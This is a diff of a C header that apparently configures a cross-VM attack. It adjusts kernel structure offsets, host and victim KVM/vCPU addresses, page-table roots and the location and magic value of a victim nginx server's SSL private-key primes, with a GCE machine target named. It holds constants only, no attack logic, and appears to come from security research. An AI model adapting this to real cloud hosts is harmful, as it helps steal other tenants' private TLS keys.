@@ -39,13 +39,12 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 
 // struct mm_struct {
 #define G_MM_PGD		0x78	// pgd_t *pgd
-// #define G_MM_HEAP		0x158	// unsigned long start_brk
-#define G_MM_HEAP		0x158 + 0x10 // start_arg
+#define G_MM_HEAP		0x158	// unsigned long start_brk
 // };
 
-#define NGINX_SSLKEY		0x0 // 0x8b99f
+#define NGINX_SSLKEY		0x8c2cf
 #define SSLKEY_LEN		(4 + 128 + 4 + 128) // magic + prime1 + magic + prime2
-#define SSLKEY_MAGIC		0x00000003
+#define SSLKEY_MAGIC		0x00818102
 
 #elif MACHINE == GCE
 
@@ -334,16 +333,16 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define BASE		0x2dd2ae218UL
 #define HOST_DIRECT_MAP	0xffffa03300000000
 #define OWN_VCPU	0xffffa03509eea300
-#define OWN_TASK	0xffffa0340565afb0
+#define OWN_TASK	0xffffa0340565afc0
 #define HCR3		0x426d18000UL
 #define OWN_KVM		0xffffb1b08d9f5000
-#define VICTIM_KVM	0xffffb1b08ef31000
-#define VICTIM_VCPU	0xffffa03509694600
-#define EPTP		0x10209e000UL
-#define GCR3		0x279a42000UL
-#define GTEXT		0xffffffffa7c00000
-#define INIT_COMM	0x34f211e68UL
-#define NGINX		0x1f93dc100
+// #define VICTIM_KVM	0xffffb1b08ef31000
+// #define VICTIM_VCPU	0xffffa03509694600
+// #define EPTP		0x10209e000UL
+// #define GCR3		0x279a42000UL
+// #define GTEXT		0xffffffffa7c00000
+// #define INIT_COMM	0x34f211e68UL
+// #define NGINX		0xffff8fb5ca5dc100
 
 #elif MACHINE == GCE
 
